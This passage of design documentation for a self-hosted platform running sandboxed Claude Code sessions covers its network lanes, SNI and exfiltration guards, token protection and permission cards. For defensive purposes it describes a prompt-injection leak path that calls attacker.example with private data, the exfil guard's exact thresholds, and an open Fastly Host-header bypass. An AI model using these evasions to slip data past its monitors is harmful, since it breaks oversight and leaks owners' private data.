  the session whose own calls named it — the path of a Write, Edit, MultiEdit or NotebookEdit, or a Bash command
  holding its name; named only by the other, it waits for the other's look; named by both or neither, it goes with
  this one and the message says «two sessions worked in the folder».
- A session that never writes into `out/` hands nothing over: a file elsewhere stays where it is.

## The face: from your phone

The same sessions and cards are also reachable from your phone — the list, a live transcript, approving a card in
an app or in a Telegram Mini App — over WireGuard only. Send `/app` to the bot to log in. See
[face.md](face.md).

### Voice

What you dictate in the app ([face.md](face.md#voice)) is transcribed by the platform itself, not the router:
`POST /api/speech` of the face API hands the recording to ElevenLabs Scribe (`retinue/speech.py`, the router's own
client, `scribe_v2`) and answers the text. Two modes, each Scribe's own options: `dictate` — `no_verbatim=true`,
your terms as `keyterms`, no `language_code`; `en` — `language_code=en`, `no_verbatim=false`, no terms. An `en`
transcript goes into a session as «(by voice, verbatim) <transcript>» (a voice note through the router stays
«(by voice) …»; the older Russian marks are still read in old transcripts).

- **The key.** `ELEVENLABS_API_KEY` from `stack.env`, given in compose to the router and the platform and to nothing
  else; the platform reads it at start and drops it from its own environment, so no child — git, a parse worker —
  inherits it. No lane, the room least of all, ever has it.
- **The way out.** The platform has no route to the internet; Scribe goes through its own proxy, `platform-egress`,
  whose list (`/srv/retinue/egress/platform-hosts.txt`) now holds `api.elevenlabs.io` besides GitHub and GitLab —
  `setup.sh` adds the line to a list written before, once (a marker, `.platform-hosts-speech`, beside it remembers
  that), so a line you remove later stays removed. The proxy is `speech.proxy`, and by default `code.proxy`
  (the same `http://platform-egress:3128`): one proxy for everything the platform sends out, named where it is used.
  Without either, or without the key, the app says voice is not set up (`/api/meta` `speech: false`).
- **Your terms.** `speech.keyterms` in `platform.yaml`: words Scribe should expect when you dictate. Checked at start
  by Scribe's rules — at most 1000, each under 50 characters and 5 words, none of `< > { } [ ] \` — so a bad one
  stops the platform with the reason rather than fail each dictation. They cost: +20% a dictation, and past 100 each
  is billed 20 s at least (the platform warns at start). The example seeds a short generic list; add your own.
- **«Cancel».** aiohttp goes on with a handler whose client went away, so the handler looks every 0.25 s (and a
  server that cancels handlers is handled the same way): a recording still being sent is cancelled with the call —
  never sent, never paid; one ElevenLabs already has (httpx took its last byte) is paid, so the call ends in the
  background — one at a time — to delete the transcript there, and the lock is free at once. nginx closes its
  connection to the platform when the browser closes its own.
- **What is kept.** Nothing of the audio or the text: the recording is held in memory for its one request, the
  transcript is deleted at ElevenLabs as soon as it is read, and a deletion that failed is kept in the platform's own
  store (`kv`, `stt.pending`) and done again when the face starts. The log has the duration and the language only.

## The room

`lane-private` is **the room**: one lane where a session sees your Base (`/work/base`), your repositories
(`/work/code/<name>`, [code.md](code.md)) and the open web, and runs subagents ([Subagents](#subagents)) — as Claude
Code on your Mac does. Your memory from the Mac comes with it, read-only
([instructions.md](instructions.md#your-memory-a-read-only-snapshot-of-the-macs)).
Every new session starts there: `/new <text>`, `/new research <question>`, a sphere's `/<sphere> <text>` and the
app's «＋» open it in the root of the Base, whose `CLAUDE.md` → `AGENTS.md` load as on the Mac
([instructions.md](instructions.md)); `/new code <repo>` opens it in that repository. It holds 12 sessions at once —
you and up to 10 sub-sessions ([Sub-sessions](#sub-sessions)) — (`max_sessions: 12`, the lane host's
`RETINUE_LANE_MAX: 12`, 11 GiB, 4096 processes: a burst, idle otherwise, on a host shared with other services);
the platform's total (`max_sessions: 12`) stays the guard. It once was to hold four, but the lane host's own default
of 2 CLI processes, never raised in compose, kept a third session «busy» in the queue whatever platform.yaml said. Before
the room the server had three lanes instead — `lane-private` (the Base, no web), `lane-code` (one repository, Bash
to GitHub and the registries) and `lane-web` (the web, nothing of yours); they are retired ([Retired
lanes](#retired-lanes)).

### What was given up, what stands in the way, what never enters

Merging them gives up one guarantee, on purpose: before, the lane with the web held nothing of
yours, so a page that took over a session had nothing to send. Now the room has all three of the «lethal trifecta» —
text from strangers (pages, repositories), your private data (the Base, your code) and a way out (`WebFetch`,
`WebSearch`). The path of a leak: a session reads a page with an instruction hidden in it, then fetches
`https://attacker.example/?d=<a piece of the Base>`.

What stands on that path — neither one a wall:

- **auto's classifier**, which sees every call no rule decides, a `WebFetch` included: no track's `allow` names
  `WebFetch` or `WebSearch` (the example says so), so a fetch is never past it by a rule;
- **the gate's exfil guard** ([below](#the-exfil-guard)): a fetch or a search that looks like it carries data comes to
  you as a card first.

What keeps the way out narrow: **the web is the CLI's, not Bash's** — exactly this far:

- **The CONNECT host.** Bash's traffic leaves only through the CLI's sandbox proxy, which lets a CONNECT through to
  `platform`, GitHub, PyPI and npm alone (`sandbox.network.allowedDomains` of
  `deploy/lanes/managed-settings-private.json`, locked by `strictAllowlist` and `allowManagedDomainsOnly`) and then
  tunnels it through the room's `HTTPS_PROXY`. The CLI's own `WebFetch` and model calls use the same proxy.
- **The TLS name.** That proxy is the SNI guard (`lane-private-sni`, `retinue/sniguard.py`): after the open proxy has
  accepted a CONNECT, it reads the client's ClientHello and splices the tunnel only when its SNI is the CONNECT host
  itself; another name, none, not TLS or an address literal is cut before a byte goes on. Without it a command could
  CONNECT to `registry.npmjs.org` and speak TLS to any site of the same CDN — measured:
  npm's address answered 200 for SNI `developers.cloudflare.com`, PyPI's for SNI `www.python.org`; through the guard
  both are cut. It never opens TLS. The room is on no network but `lane-private`, the guard on `lane-private` and
  `room-out`, the open proxy on `room-out` and `outside`: nothing in the room reaches the open proxy past the guard.
- **What does not hold: the `Host` inside TLS.** A CDN that routes by the HTTP `Host` whatever the SNI lets a command
  reach its other customers through an allowed name. Measured: Fastly does — SNI `pypi.org` with `Host:
  www.fastly.com` answered fastly.com's page — so through PyPI and `files.pythonhosted.org` Bash can reach any site
  served by Fastly, including one an attacker sets up there, without a card. Cloudflare refuses it (npm: 403),
  GitHub redirects or refuses. Closing it needs TLS decryption of Bash's traffic or dropping PyPI from Bash's list
  (`pip` through a mirror the platform fetches): not done; your call.

A host added to that list (and the image rebuilt) is one more way out.

What never enters the room: your mail, Telegram, the bot tokens, the subscription token (a pipe to the CLI, below),
any GitHub or registry credential and any right to push — a commit leaves only by your button, the Base's «To the Base»
([base.md](base.md)) and the code's ([code.md](code.md)). There are no documents in the Base. The never list still
holds in the room ([The never list](#the-never-list-and-the-courier-card)).

### The exfil guard

Before any rule, the gate reads every `WebFetch` and `WebSearch` (`retinue/exfil.py`); one that looks like it carries
data is deferred to you as an ordinary card — «Permission», «Looks like data leaving: <why>. Read the whole address»,
the address or query whole as its input — never refused and never let through silently. It is bound, kept across
restarts and decided like every card ([Approvals](#approvals)); granted, the call runs once. It goes through the
gate's one owner-card path, so a subagent's suspicious fetch is denied there like any call a subagent would defer.
It comes before a track's `allow` rules; and `platform.yaml` refuses to load a track on a web lane whose `allow`
names `WebFetch`, `WebSearch` or `WebFetch(domain:*)` — they would take every fetch past the classifier. The
thresholds, in characters after the escapes are read:

| What | Card when | Why this number |
|---|---|---|
| the query string (`QUERY_MAX`) | over 200 | a search or a booking link the model builds is well under; a paragraph of notes is over |
| params (`PARAMS_MAX`) | over 12 | a payload split into many short values |
| a run of encoded data (`BLOB_MIN`) in a path segment, a param's name or value | 64 or more | 48 bytes as base64, 32 as hex; base64url only with a piece mixing cases and digits, so slugs and Notion ids pass; percent-escapes only when they hide ASCII or bytes that are not UTF-8, so Cyrillic passes |
| the same run in the path and query read whole: escapes undone twice, every ASCII separator (`/ . - _ ~ , ! : ; = &` …) taken out | 64 or more, a quarter of its letters or more upper case | base64 cut into pieces joins up again; a slug of words joined is lower case and Title_Case or CamelCase about a sixth upper, so they pass |
| per run, the path and query characters one site (its registrable domain) has taken (`SITE_BUDGET`) | over 6 000: the next address to it cards, and the count starts again | a research session reads 20–40 pages of a site with 40–80-character paths; a payload cut under every other threshold adds up |
| the path (`PATH_MAX`), the host (`HOST_MAX`), one host label (`LABEL_MAX`) | over 300, 80, 40 | data split over many segments or a subdomain |
| a login in the address | always | it goes to the site as a header |
| a search query (`SEARCH_MAX`) | over 300, or with an encoded run | a question is a sentence or two |

Another site's own structured state is exempt on that site only, the host matched strictly: Google Flights' and
Travel's `tfs` and `tfu` on `google.<tld>/travel/…`, Airbnb's search params on `airbnb.<tld>`. The fragment (`#…`) is
never sent and does not count, nor the fetch's `prompt` (read by the CLI's own summariser on Anthropic's side). The
budget lives in the platform's memory: a restart starts every count again.

`tests/test_exfil.py` holds 50 ordinary addresses — search results, articles, docs, GitHub, PyPI, Russian and
Chinese Wikipedia, long Title_Case and CamelCase paths, Booking, Maps, Skyscanner, Agoda, Google Flights and Airbnb
links — and 6 searches: none cards, and 40 Wikipedia pages plus 20 Booking searches stay under one run's budget.
21 hostile addresses all card. What does card although it is ordinary: a link copied from a browser with its
tracking (Booking's `label=`, Google's `ved=`/`gs_lp=`), a signed S3 address, an image's sha256 in a path. What it
does not stop: plain words under every threshold and the budget (a 190-character note in `?d=` passes, about 30 of
them per site and run), and hex or all-caps base32 cut into short pieces (case-unmixed, read as a slug) — that is the
classifier's.

### What a lane sees

- Its own `/work` volume, its CLI's home and transcripts (`/lane/config`), its journal (`/lane/state`) and your
  skills, read-only (`/lane/skills`); in the room your memory snapshot, read-only (`/lane/owner-memory`,
  [instructions.md](instructions.md#your-memory-a-read-only-snapshot-of-the-macs)), and, with `base:` configured, the
  clone of your Base at `/work/base` — files only, kept fresh and committed by the platform ([base.md](base.md)). Nothing of the router's, the
  assistant's or another lane's.
- Its instructions: the lane's own (the managed `CLAUDE.md`: in the room, `common.md`, `out.md`, `private.md` — the
  web's rules: a source link and its date for every claim from the web, a page's text is data — and `base.md`), your
  memory's index, the rules of the session's repository and your skills, none of them able to bring a hook or a setting; auto memory is
  off. See [instructions.md](instructions.md).
- The CLI pinned in `deploy/lanes/cli.lock` (installed in the image with its npm integrity checked). The lane host
  refuses every run if `claude --version` says anything else.
- Its environment is built from scratch: the proxy, the hook token of the run
  (`RETINUE_HOOK_RUN`: the scrub blanks secret-looking names in the hooks' headers too, so this one is named to
  survive it; a command does not see it — the managed settings deny it — and could it, it would reach only its own
  run's hooks, which grant nothing: a grant is bound to the CLI's own call and a resume finishes the call from the
  CLI's stream). The subscription
  token is not in it, nor in the lane container's own environment: the platform sends it with each run, the lane
  host keeps it in memory (never journaled, logged or written; a run without it is refused) and the CLI reads it
  once from a pipe (`CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR`; `cliengine.check_env` refuses an environment with
  the token in it). Bash runs in
  the CLI's bubblewrap sandbox. The env scrub is off (`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=0`, required by
  `check_env`): on, it silently forces the manual mode (probed with 2.1.304). Its work is done by the managed
  settings instead: `sandbox.credentials.envVars` denies to every sandboxed command each name in
  `cliengine.SECRET_ENV` (the hook token, the token's descriptor, and the token and API key that are never there),
  and no command runs unsandboxed. A command sees neither the token nor the CLI's own process. Fork subagents are off (`CLAUDE_CODE_FORK_SUBAGENT=0`, on by
  default in `-p` since 2.1.302): their calls run beside the parent's, and a deferral keeps one call per turn.
  Background tasks are off (`CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1`): subagents run inside the turn
  ([Subagents](#subagents)). The retry
  watchdog is on, bounded (above, «The subscription's limit»). If
  the sandbox cannot start (bubblewrap or socat missing,
  bubblewrap blocked), the CLI refuses to start — no session runs, and none runs unsandboxed.
- Its security profiles. bubblewrap needs a user namespace and a fresh `/proc` inside it, which Docker's defaults
  and Ubuntu 24.04 refuse. A lane runs under Docker's own profiles plus exactly that: AppArmor `retinue-lane`
  (`deploy/lanes/apparmor`: docker-default with `userns` and mounts) and seccomp `deploy/lanes/seccomp.json`
  (Docker's default with `unshare`, `clone`, `setns`, `mount`, `umount2`, `pivot_root`), and unmasked system paths,
  which the AppArmor profile still denies writing. `setup.sh` installs both and loads the AppArmor profile; the
  rest of the stack keeps Docker's defaults and the host's restriction.
- The managed settings in the image (`deploy/lanes/managed-settings-<lane>.json`, one per lane, picked by the
  image's build arg `LANE`, root's, read-only): in the room `WebSearch` and `WebFetch` allowed but `WebFetch` to
  `lane-private`, `lane-private-egress`, `localhost` and `127.0.0.1` (in the retired `lane-code` both denied); `Read`
  of `/proc` and of `/lane` but the CLI's spill of a large result (below), bypass mode disabled, hooks only
  to `http://platform:9500/hook/*`, Bash sandboxed (with `failIfUnavailable`: never unsandboxed; with `allowUnsandboxedCommands: false`: no `dangerouslyDisableSandbox` escape, not even by a card) with
  `/lane/config`, `/lane/run` and `/etc/claude-code` not writable, the CLI's secrets denied to commands (above), and
  the sandbox's network list locked: `strictAllowlist` and `allowManagedDomainsOnly` (both under
  `sandbox.network`), so in auto a Bash call's own `allowed_domains` cannot widen it — the CLI refuses such a call
  («allowed_domains cannot widen network access in this session», probed with 2.1.304) — and no `WebFetch(domain:…)`
  allow rule of a track opens it either. The sandbox's network filter (`sandbox.network.allowedDomains`) carries the
  CLI's own hook calls too: in the room it lets through `platform` and the hosts of
  `deploy/egress/lane-code-hosts.txt` but `api.anthropic.com` (the CLI's own model calls never pass this filter),
  so Bash can `git clone`, `pip install` and `npm install`. A command reaching
  the platform gets nowhere without the run's hook token, which is denied to it. The CLI's sandbox proxy checks the
  host and then goes on through the lane's own proxy (`HTTPS_PROXY` in the CLI's environment; `platform` directly,
  by `NO_PROXY`). Settings files a session writes into its directory or home are never read
  (`--setting-sources ""`).
- The network: the room is on `lane-private` (internal) with the platform and its SNI guard, nothing else — not
  `face-platform`, not `platform-router`, not `outside`. Without the proxy it reaches nothing. No lane holds a GitHub,
  registry or mail credential. A host Bash should reach goes into `deploy/lanes/managed-settings-private.json`, and
  the image is rebuilt.

### The open proxy

`lane-private-egress` (`deploy/egress/open-squid.conf`; until the room it was lane-web's), behind the SNI guard,
lets through `CONNECT` to
port 443 of any host, plain HTTP never, and refuses: every address in `deploy/egress/open-deny-nets.txt` (RFC 1918,
loopback, link-local, CGNAT 100.64/10, IPv6 unique-local, link-local, loopback, NAT64 — ours, put back by every
`setup.sh` run); this server's public addresses (`/srv/retinue/egress/open-deny-ips.txt`: filled from `ip addr`,
written whole or not at all, again on every run while it has no entry, then yours); your own domains
(`/srv/retinue/egress/open-deny-domains.txt`, by name only: written once with no entry — put your zone there,
`.example.com` for the zone and every name under it). `setup.sh` says so at the end of every run while either list
is empty, and prints the restart of `lane-private-egress` when it changed one of its files. The addresses are checked
after Squid resolves the name, so a public name that resolves inside is refused like the address itself — as far as
Squid's own lookup goes: the check and the connection use its DNS cache, not one atomic lookup, and a name rebound in
between can slip through. So what is inside keeps its own lock anyway: the hub and the face want their key and your
devices' addresses, the platform's hooks a run's token. A host firewall rule closes even that race (optional, below).
The CLI's own model calls go through it too (`api.anthropic.com` is a public host).

What the pinned CLI (2.1.304) does here, probed in the lane image against a stand-in API and platform: `WebFetch`
goes through `HTTPS_PROXY`; before each fetch it asks `api.anthropic.com` whether the domain may be fetched (a
`CONNECT api.anthropic.com` in the proxy's log). It refuses a host name without a dot by itself («cannot fetch
localhost or other hostnames without a dot»), so `platform`, `lane-private` and `lane-private-egress` are refused
before any rule; `platform.` (with the dot) does not match `NO_PROXY`, goes to the proxy and is refused there. There
is deliberately **no** `WebFetch(domain:platform)` rule: a `domain:` deny is also a denied domain of Bash's sandbox,
whose filter the CLI's own hook calls pass too — with it, every hook fails and every call is blocked. The managed
`CLAUDE.md` is read although the runs pass `--setting-sources ""`.

Residual paths, and why they are acceptable: `NO_PROXY=platform` (the hooks go straight to the platform) could let
only a fetch of exactly `platform` skip the proxy, and WebFetch refuses that name; Bash reaches the platform, but the
hook port needs the run's hook token, which no command sees. `WebSearch` runs on Anthropic's side: the query leaves
through the model API, not the proxy — the exfil guard reads it, the proxy never sees it.

Your own domains as rules too (optional; the proxy already refuses them): add
`deny: ['WebFetch(domain:example.com)', 'WebFetch(domain:*.example.com)']` to the lane in `platform.yaml`. Never
put `WebFetch(domain:*)` or `WebFetch` in a track's `allow`: it takes the classifier off every fetch, and a `domain:`
rule outside the managed settings no longer opens Bash's sandbox (`allowManagedDomainsOnly`), but that lock is one
setting away from gone.

The firewall rule (optional, yours to apply; `setup.sh` does not touch the host's firewall): packets from the proxy
to anything inside are dropped by the kernel, whatever Squid decided. Docker gives the proxy a new address when it
is recreated, so apply it again after that, and save it the way your host keeps its rules across a reboot:

```bash
EGRESS=$(docker inspect -f '{{(index .NetworkSettings.Networks "retinue_outside").IPAddress}}' retinue-lane-private-egress-1)
for net in 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 100.64.0.0/10 169.254.0.0/16; do
  sudo iptables -I DOCKER-USER -s "$EGRESS" -d "$net" -j DROP    # other containers, the VPN, the cloud's metadata
done
sudo iptables -I INPUT -s "$EGRESS" -j DROP                       # the host itself: its public address, every gateway
```

`tests/test_open_proxy.py` runs the same proxy files in the pinned Squid image wherever Docker is (the lists still
empty, a name that resolves inside, `[::ffff:10.8.0.1]`, the filled lists).

### The token out of reach

On every lane. No lane container has it in its environment (Docker's init and the lane host would show it at
`/proc/<pid>/environ` to the lane's user): the platform, which holds it, sends it with each run; the lane host keeps
it in memory only and hands it to the CLI through a pipe (`CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR`), which the CLI
reads once. Then two layers that do not depend on it. The platform's gate refuses, before any rule or card, a call
whose input has the shape of an Anthropic token (`sk-ant-oat01-…`, `sk-ant-api03-…`, `sk-ant-ort01-…`, also
percent-escaped) in an address, a search, a command or a file; and it keeps every file tool inside `/work` as the
lane sees it — `.`, `..`, `//`, `~` folded, brace alternatives expanded, links followed through its own read-only
mount of the lane's `/work`, so a repository's `README -> /proc/1/environ` is refused — but for `Read` and `Grep` of
the CLI's spill of a large result and the read-only file tools in your skills. The session reads why, in English.
And the CLI's own deny rules (every lane's managed settings), which follow links: `Read` of `/proc`, `/lane/state`,
`/lane/run`, the CLI's config files and its transcripts — not all of `/lane/config`: the CLI saves a tool result too
large for the conversation to `/lane/config/claude/projects/<project>/<session>/tool-results/<id>.txt` and tells the
model to `Read` it there. Bash's sandbox has its own `/proc`: a command sees the sandbox's processes, not the CLI's.
The shape check stops a token written out whole, not one the model has encoded. Probed in the lane image: the token
by pipe is sent with every request of a run and passes `auth status`; a Bash command sees 5 processes, all the
sandbox's, and the token in none of their environments; a 1.9 MB result is spilled as above and its `Read` passes the
rules.

**The lane's own token** (`RETINUE_LANE_TOKEN_*`) is still in its environment: the lane host checks the
platform's commands with it. A model that read it could command its own lane host — start a run (with no login
of its own to give it), write into a live session of the same lane, stop one, read or confirm away the lane's
journal before the platform pulls it — but only by reaching `127.0.0.1:9600` or the lane's own address, which it
cannot: Bash's sandbox lets through `platform` and the code hosts alone, WebFetch refuses a name without a dot and the
proxy every inside address, and the file tools never reach `/proc` to read it. It opens nothing of the platform's or
another lane's.

### Retired lanes

`lane-code`, `lane-web` and their proxies are under the compose profile `legacy-lanes`, which the stack never starts
(`COMPOSE_PROFILES` names `platform`): their volumes stay as the archive, the platform is on neither network and
mounts neither volume. A session whose lane is not in `platform.yaml`, or is there with `retired: true`, stays in the
app's list, opens with its transcript, cards and files (all in the platform's database), and takes nothing in: a
message, a card's decision or a question's answer gets «The lane is retired: start a new session.», and
nothing runs. At the platform's start every card still asking in such a session goes stale («Expired: the lane
is retired») and the session stops waiting, so it leaves «Decide» and `/wait`. A retired lane needs no token, gets no
client and no poller, a run sent to it is refused at once, and a run of it left open holds no room. A lane still
named without `retired: true` is a live one: if its container is gone, a session sent there waits on a lane nobody
answers and holds a place of the total — mark it retired or take it out.

### Moving to the room

The operator's steps on the server, in this order (the platform's own sessions keep their directories; a session on
`lane-code` or `lane-web` becomes read-only):

```bash
cd /opt/retinue && git pull
sudo TELEGRAM_OWNER_ID=<id> bash deploy/setup.sh   # writes /srv/retinue/egress/open-*: open-squid.conf and
                                                   # open-deny-nets.txt anew; open-deny-ips.txt and -domains.txt copied
                                                   # once from lane-web-deny-*.txt (yours) — check both
sudoedit /srv/retinue/platform/platform.yaml       # below
docker compose -p retinue --env-file /srv/retinue/stack.env -f deploy/compose.yml --profile legacy-lanes \
  stop lane-code lane-code-egress lane-web lane-web-egress
docker compose -p retinue --env-file /srv/retinue/stack.env -f deploy/compose.yml --profile legacy-lanes \
  rm -f lane-code lane-code-egress lane-web lane-web-egress        # containers only: their volumes stay
docker compose -p retinue --env-file /srv/retinue/stack.env -f deploy/compose.yml up -d --build \
  lane-private-egress lane-private-sni lane-private platform
```

In `platform.yaml`: the lane `private` gets `web: true`, `max_sessions: 12` and in `deny` your domains as rules
(`WebFetch(domain:example.com)`, `WebFetch(domain:*.example.com)`), not `WebSearch` or `WebFetch`; the lanes `code`
and `web` go (or stay with `retired: true`); the tracks `notes` and `research` go to `lane: private` with `cwd: base`
and no `allow` for the web tools or `Edit(./**)` (the platform refuses `WebFetch`, `WebSearch` and
`WebFetch(domain:*)` there); `code` goes to `lane: private` with `cwd: code` ([code.md](code.md)); every sphere loses its `cwd:
base/<space>` (the track's `base` is the root) — compare with `deploy/platform/platform.example.yaml`. The files
`/srv/retinue/egress/lane-web-*` and `lane-private-hosts.txt` are no longer read; delete them when you like. The
firewall rule above, if you had it for `lane-web-egress`, goes to `lane-private-egress`.

Then, from inside the room (by `docker exec`, not by the model):

```bash
lane() { docker exec retinue-lane-private-1 "$@"; }
lane curl -sS -o /dev/null -w '%{http_code}\n' -x http://lane-private-sni:3128 https://example.com   # 200
for url in https://10.8.0.1 https://172.17.0.1 https://hub.in.example.com https://203.0.113.7; do
  lane curl -sS -o /dev/null -x http://lane-private-sni:3128 "$url"    # each: 403 (the open proxy, or no name)
done
lane curl -sS -m 10 -o /dev/null -x http://lane-private-sni:3128 \
  --connect-to developers.cloudflare.com:443:registry.npmjs.org:443 https://developers.cloudflare.com/   # fails: SNI
lane curl -sS -m 10 -o /dev/null -x http://lane-private-egress:3128 https://example.com   # fails: not on its network
lane curl -sS -m 10 -o /dev/null --noproxy '*' https://example.com    # fails: no route out of `lane-private`
docker compose -p retinue logs --tail 20 lane-private-sni   # tunnel example.com; refused registry.npmjs.org: SNI …
docker exec retinue-lane-private-egress-1 tail -20 /var/log/squid/access.log   # TCP_TUNNEL example.com, TCP_DENIED the rest
```

(`hub.in.example.com` and `203.0.113.7`: one of your own names and this server's address.) Last, live sessions:
`/new research …` uses `WebSearch` and `WebFetch` (the classifier lets an ordinary fetch through without a card) and
answers with a link and a date per claim; asked to fetch `https://example.com/?d=` and 80 characters of base64, it
comes to you as a card «Looks like data leaving…»; in a Bash call `curl -sI https://example.com` fails and
`git ls-remote https://github.com/git/git HEAD` answers; a reply to an old `lane-code` session says «The lane
is retired…».

## Always rules

Rules in Claude Code's own syntax (`Bash(make test:*)`, `Edit`, `Read(src/**)`), matched by the CLI itself:

- in code: `BASE_ALLOW` (`Read`, `Grep`, `Glob`, `TodoWrite`, `Skill`) and `BASE_DENY` (`CronCreate`, `CronDelete`,
  `ScheduleWakeup`, `RemoteTrigger`, and `EnterPlanMode` and `ExitPlanMode`, which came with the prompt tool of
  [Questions](#questions) and have no card yet) in `retinue/approvals.py`, and `WEB` (`WebSearch`, `WebFetch`) on every lane
  but one with `web: true` in `platform.yaml` (the room) — whatever that lane's `deny` and a track's `allow` say;
- per lane: `deny` and `card` in `platform.yaml`;
- per track: `allow`, `deny` and `card` in `platform.yaml`.

A **card rule** (`card: ['Bash(git commit:*)']`) is a call that always comes to you as a card, whatever the
classifier would say, and even when a track's `allow` names it too; a `deny` or the never list beats it. `BASE_CARD`
in `retinue/approvals.py`, the card rules of every lane, is empty: what leaves the system is the never list, the
classifier stops the rest of what you would want to see, and the commit to the Base gets its own button in a later
part. A card rule is neither in `--allowedTools` nor in `--disallowedTools`: the CLI must neither run it by itself nor
refuse it past your grant.

Before any of them, the gate refuses on every lane a call whose input looks like an Anthropic token and any file
tool's path that leads out of `/work`, by itself or by a link ([The token out of reach](#the-token-out-of-reach)): a file the model should read outside `/work` is for Bash to `cat`, which the classifier decides. The
spill of a large result, your skills (`/lane/skills`) and, in the room, your memory snapshot (`/lane/owner-memory`) are
the places outside it the read-only file tools reach.

There is no button that writes a rule: always rules are edited in `platform.yaml`, never derived from a pressed
card.

## Approvals

Every run is `claude -p --model claude-opus-5-5[1m] --effort xhigh --permission-mode auto` (a resume too: the CLI
does not carry the mode over), as 99% of your turns on the Mac: the latest Opus by its full id, its million-token
context, extra-high effort (`cliengine.MODEL`, `EFFORT` — without them a headless CLI takes a smaller default model;
the assistant has the same in `agent.yaml`). For each call the order is the CLI's (probed with 2.1.304): the platform's gate (PreToolUse)
first, then the rules, then auto's **classifier**:

- **The gate's refusals** (a token-shaped input, a file path out of `/work`) — denied, before anything else.
- **The never list** — denied, and a courier card ([below](#the-never-list-and-the-courier-card)).
- **A deny rule** — the CLI denies it; no card. A side question's session stays read-only this way: `Edit`,
  `Write`, `MultiEdit`, `NotebookEdit`, `Bash`, `EnterWorktree`, `ExitWorktree`, `Workflow` and `AskUserQuestion`
  (it never waits on a question) are deny rules of its runs. And its runs never leave a call to the classifier: whatever no rule names is a card, as in the fallback below.
- **A web call that looks like it carries data** — a `WebFetch` address or a `WebSearch` query past the exfil
  guard's thresholds — deferred to you as a card «Looks like data leaving: …», before any allow rule
  ([The exfil guard](#the-exfil-guard)).
- **A command whose text names a never-list action** the CLI's matcher missed (`git -C . push`, `env git push`,
  `sh -c 'git push'`, `/usr/bin/ssh`) — a card «Looks like an action only you take: …». The gate's own reading
  of the never list (`approvals.NEVER_TEXT`, built from `NEVER`): each entry's words in order within one command,
  quotes and backslashes removed; wide on purpose, so `git log --grep push` is a card too, never a deny.
- **A card rule** — deferred to you as a card, its rule on it («Always ask: rule …»). For a tool a card
  rule names, the gate waits the whole `MARK_WAIT_S` (1 s) for a card or never mark, so an allow mark that comes
  first cannot run it without the card.
- **AskUserQuestion** — always deferred to you as a question ([Questions](#questions)), whatever the rules but a
  deny say.
- **An allow rule** — the CLI runs it.
- **Anything else** — the gate gives no decision and the classifier decides: it runs what is ordinary work and
  blocks what is destructive, irreversible or leaves the machine. A block is no dead end: the gate tells the CLI the
  model may retry (`PermissionDenied` → `retry: true`), and the same call made again — Bash's `description` aside —
  is deferred to you as a card that says why: «Stopped by the classifier: [Remote Repoint]». A retry is given once per
  call and at most twice per run (`RETRIES_PER_RUN`), far from the CLI's own limit (a headless run aborts after 3
  classifier denials in a row or 20 in all); a retry is deferred, never denied. A block that does not come back as a
  card — no retry given, or the model went on and the run ended — comes as a notice card without buttons
  («Blocked · …», the command, the reason). The transcript keeps it too: the call's item carries the reason
  (`denied`) and the CLI's error as its result.

**When a run is not in auto.** The CLI starts in manual without failing when auto is unavailable to it (the
model, the account, the scrub turned on). Its init line says so; the platform tells you once per session («Auto
mode is off in this session: the CLI started in default mode…») and that run falls back to the gate before auto:
every call no rule decides comes as a card, and a call the CLI still asks about despite a rule (a compound
command, a path outside the directory) is refused with a request to repeat it, and repeated, comes as a card. The
gate reads the mode from each hook's `permission_mode` and from the run's init line once the platform has it:
either one not `auto`, and the call falls back. In auto the gate waits for a call's marker hooks only when the run
has a card rule — the only mark that changes its answer there.

A card: «Permission · <track> · session <id>», the tool, the directory, why it came (a card rule, the classifier's
reason; nothing in the fallback), the input verbatim (a Bash command as it is), and what code found in it. Buttons:

- **«Allow»** — the session resumes and the call runs exactly once, past the classifier (the gate's `allow`):
  the grant is bound to a digest of the tool,
  its input, the directory and the file it would change, as the file is now. A file changed since the card, a
  second press, a press after a restart that already used it — nothing runs again.
- **«Deny»** — the session resumes and the model is told you refused.
- **«Open»** — the whole input as a file, with the same buttons. A card longer than one Telegram message offers
  only «Open».

A card survives restarts of the platform, the lanes and the router: press it an hour later and the call runs once.
But a press is a resume, and since CLI 2.1.304 a resume of a conversation idle past the one-hour prompt cache re-reads
its whole context uncached — a noticeable share of the subscription's 5-hour window. So a card whose session has been
silent for 55 minutes is rewritten, in Telegram and in the app, with «The session is idle N min — resuming re-reads
the context (~Kk tokens) uncached» before its input line: K is the input and cache tokens of the session's last
top-level request (not the turn's `result`, which sums every request of the turn); without one, no number. The line
is rewritten at 90 minutes and then as the hours change («2 h», …, «over a day»), not every minute; the buttons,
«Open in the app» and the card's expiry stay. Once the card is decided, stale or expired, the line goes. Every
decision is journaled as the card's last note — a Telegram press too, though it edits its card at once — so an idle
rewrite still on its way to the router never brings the buttons back.
Unpressed for 7 days, it expires. When the model makes several calls at once and the first is deferred, the CLI
keeps only the last one; the others are dropped and the model has to ask again.

### Subagents

A session runs subagents (the `Agent` tool) as on your Mac — to search, read and work in parallel. Probed with
2.1.304 in our `-p` stream-json auto setup, against the fake API and with a few real runs on the Mac's login:

- **They run, and their calls pass the gate.** Every call a subagent makes fires the same hooks as the main agent's —
  PreToolUse, its marks, PermissionDenied, PostToolUse — with the same fields plus the subagent's `agent_id` and
  `agent_type`; the main agent's calls carry neither. So the gate's refusals, the never list and its courier card,
  deny and allow rules and auto's classifier apply to a subagent as to the main agent. The `Agent` call itself is
  the classifier's (a real one lets an ordinary one through). The subagent's report (`SubagentHandback`) is a call
  too, the classifier's.
- **A subagent cannot wait for you.** A deferral inside a subagent ends the subagent without its report; the main
  agent goes on and the run ends with no `deferred_tool_use` — nothing a resume could run, the card an orphan. So the
  gate never defers a subagent's call: what would come to you as a card — a card rule, a never action by its text, a
  classifier block made again, the fallback's every call, a question, a shutdown — is denied with «A subagent cannot
  wait for the owner's decision…» (`gate.SUBAGENT`), no card made; a classifier block in a subagent is not retried and comes
  as a notice card. The subagent names the step in its report and the main agent makes the call itself, which then
  comes to you as usual. The lane's instructions say the same.
- **In the foreground, several at once.** 2.1.304 launches a subagent in the background by default in `-p`. A
  backgrounded one outlives its turn: the CLI holds the turn's `result` until it ends, runs one more turn on its
  notification and writes a `result` for each — two or three for one run, a deferred call followed by a turn after
